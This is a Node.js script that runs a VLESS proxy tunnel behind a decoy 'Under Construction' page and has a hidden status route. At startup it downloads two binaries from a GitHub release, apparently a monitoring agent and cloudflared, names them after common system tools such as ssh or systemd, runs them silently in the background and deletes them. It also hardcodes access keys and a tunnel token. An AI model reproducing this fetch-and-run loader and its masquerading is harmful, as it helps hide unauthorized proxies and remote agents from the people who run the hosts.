const { exec } = require('child_process');
const { WebSocket, createWebSocketStream } = require('ws');
const http = require('http');
const { URL } = require('url');
const net = require('net');
const os = require('os');
const path = require('path');
const fs = require('fs');
const axios = require('axios');

const CONFIG = {
    UUID: (process.env.UUID || 'feefeb96-bfcf-4a9b-aac0-6aac771c1b98').replace(/-/g, ""),
    PORT: process.env.PORT || process.env.SERVER_PORT || 3000,
    N_S: process.env.N_S || 'nz.seav.eu.org',
    C_B: process.env.C_B || '1.seaw.cf',
    N_K: process.env.N_K || 'tCF502sPynv35ah5z3',
    C_T: process.env.C_T || 'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNjVhNzM5OTktZDIwNi00MDEwLTg0NTYtYWY0ZDQzMTNjY2ExIiwicyI6IlltSXdZMkkxTmpVdFlXUmtZaTAwTUdRM0xUa3dNVFF0TmpFd1lUWmlaR0ppTWpjMyJ9',
    C_D: process.env.C_D || 'deepnote.seav.eu.org'
};

const generateCommonFilename = () => {
    const commonNames = [
        'node', 'npm', 'curl', 'wget', 'ssh', 'rsync', 'tar', 'gzip',
        'python', 'java', 'systemd', 'cron', 'dbus', 'udev', 'kmod',
        'bash', 'sh', 'vim', 'nano', 'git', 'apt', 'yum', 'service'
    ];
    return commonNames[Math.floor(Math.random() * commonNames.length)];
};

const generateVlessLink = () => {
    const vlessUrl = `vless://${CONFIG.UUID}@${CONFIG.C_B}:443?type=ws&path=${encodeURIComponent('/vl')}&host=${CONFIG.C_D}&encryption=none&sni=${CONFIG.C_D}&fp=chrome&security=tls#${CONFIG.C_D}`;
    return Buffer.from(vlessUrl).toString('base64');
};

const HTML_TEMPLATES = {
    home: `
        <html>
        <head>
            <title>Under Construction</title>
            <style>
                body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}
                .container{text-align:center;background:white;padding:60px 40px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.2);max-width:500px;margin:20px}
                h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}
                p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}
                .icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}
                .footer{color:#999;font-size:0.9em;margin-top:30px}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="icon">[!]</div>
                <h1>Website Under Construction</h1>
                <p>We're working hard to bring you something amazing. Please check back soon!</p>
                <div class="footer">Thank you for your patience.</div>
            </div>
        </body>
        </html>
    `,
    status: (port, vlessLink) => `
        <html>
        <head>
            <title>Service Status</title>
            <style>
                body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}
                .container{max-width:600px;margin:0 auto;background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
                h1{color:#333;text-align:center}
                .info-item{margin:20px 0;padding:15px;background:#f8f9fa;border-radius:5px}
                .label{font-weight:bold;color:#555;margin-bottom:10px}
                .value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}
                .copy-btn{background:#007cba;color:white;border:none;padding:8px 15px;border-radius:3px;cursor:pointer;margin-top:10px}
                .copy-btn:hover{background:#0056b3}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Service Running</h1>
                <div class="info-item">
                    <div class="label">Port:</div>
                    <div class="value">${port}</div>
                </div>
                <div class="info-item">
                    <div class="label">Connection Link (Base64):</div>
                    <div class="value" id="vlessLink">${vlessLink}</div>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${vlessLink}').then(()=>alert('Copied!'))">Copy</button>
                </div>
            </div>
        </body>
        </html>
    `
};

const server = http.createServer((req, res) => {
    try {
        const { pathname } = new URL(req.url, `http://${req.headers.host}`);
        
        switch (pathname) {
            case '/':
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(HTML_TEMPLATES.home);
                break;
            case '/x':
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(HTML_TEMPLATES.status(CONFIG.PORT, generateVlessLink()));
                break;
            case '/health':
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok', uptime: process.uptime() }));
                break;
            default:
                res.writeHead(404, { 'Content-Type': 'text/plain' });
                res.end('Not Found');
        }
    } catch (error) {
        if (!res.headersSent) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Internal Server Error');
        }
    }
});

const ws = new WebSocket.Server({ server, path: '/vl' });

ws.on('connection', ws => {
    ws.once('message', msg => {
        const [VERSION] = msg;
        const id = msg.slice(1, 17);
        
        if (!id.every((v, i) => v === parseInt(CONFIG.UUID.substr(i * 2, 2), 16))) return;
        
        let i = msg.slice(17, 18).readUInt8() + 19;
        const targetPort = msg.slice(i, i += 2).readUInt16BE(0);
        const ATYP = msg.slice(i, i += 1).readUInt8();
        
        let host;
        if (ATYP === 1) {
            host = msg.slice(i, i += 4).join('.');
        } else if (ATYP === 2) {
            const len = msg.slice(i, i += 1).readUInt8();
            host = new TextDecoder().decode(msg.slice(i, i += len));
        } else if (ATYP === 3) {
            host = msg.slice(i, i += 16)
                .reduce((s, b, idx, a) => idx % 2 ? s.concat(a.slice(idx - 1, idx + 1)) : s, [])
                .map(b => b.readUInt16BE(0).toString(16))
                .join(':');
        }

        if (ws.readyState === WebSocket.OPEN) {
            ws.send(new Uint8Array([VERSION, 0]));
            const duplex = createWebSocketStream(ws);
            duplex.on('error', () => {});
            
            const connection = net.connect({ host, port: targetPort }, function() {
                this.write(msg.slice(i));
                duplex.pipe(this).pipe(duplex);
            });
            
            connection.on('error', () => {});
        }
    });
});

const downloadAndRun = async (url, command) => {
    if (!url) return;
    
    try {
        const commonFilename = generateCommonFilename();
        const tmpPath = path.join(os.tmpdir(), commonFilename);
        
        const response = await axios({
            method: 'GET',
            url: url,
            responseType: 'stream',
            timeout: 30000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            }
        });
        
        const writer = fs.createWriteStream(tmpPath);
        response.data.pipe(writer);
        
        writer.on('finish', () => {
            exec(`chmod +x "${tmpPath}"`, (error) => {
                if (!error) {
                    exec(`"${tmpPath}" ${command} > /dev/null 2>&1 &`, () => {
                        exec(`rm -f "${tmpPath}"`);
                    });
                }
            });
        });
        
        writer.on('error', () => {
            exec(`rm -f "${tmpPath}"`);
        });
        
    } catch (error) {
        
    }
};

const arch = process.arch;
const getUrl = (base) => arch === 'arm64' ? `${base}-arm` : base;

const baseUrl = 'https://github.com/seav1/dl/releases/download/upx';

downloadAndRun(
    getUrl(`${baseUrl}/nz`), 
    `-s ${CONFIG.N_S}:443 -p ${CONFIG.N_K} --tls  --report-delay 2 --disable-auto-update`
);

downloadAndRun(
    getUrl(`${baseUrl}/cf`), 
    `tunnel --edge-ip-version auto --protocol http2 --no-autoupdate run --token ${CONFIG.C_T}`
);

server.listen(CONFIG.PORT, () => {
    
});
